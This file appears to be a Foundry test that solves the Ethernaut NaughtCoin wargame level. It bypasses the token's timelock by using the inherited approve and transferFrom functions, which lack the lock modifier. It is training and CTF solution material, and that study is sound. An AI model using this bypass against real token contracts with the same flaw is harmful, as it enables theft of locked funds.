pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../NaughtCoin/NaughtCoinFactory.sol";
import "../Ethernaut.sol";

contract NaughtCoinTest is Test {
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
    }

    function testNaughtCoinHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        NaughtCoinFactory naughtCoinFactory = new NaughtCoinFactory();
        ethernaut.registerLevel(naughtCoinFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(naughtCoinFactory);
        NaughtCoin ethernautNaughtCoin = NaughtCoin(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Use approve and transferFrom which are inherited from ERC20.sol don't have the timelock modifier
        ethernautNaughtCoin.approve(tx.origin, (1000000 * (10**uint256(18))));
        ethernautNaughtCoin.transferFrom(tx.origin, address(100), (1000000 * (10**uint256(18))));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}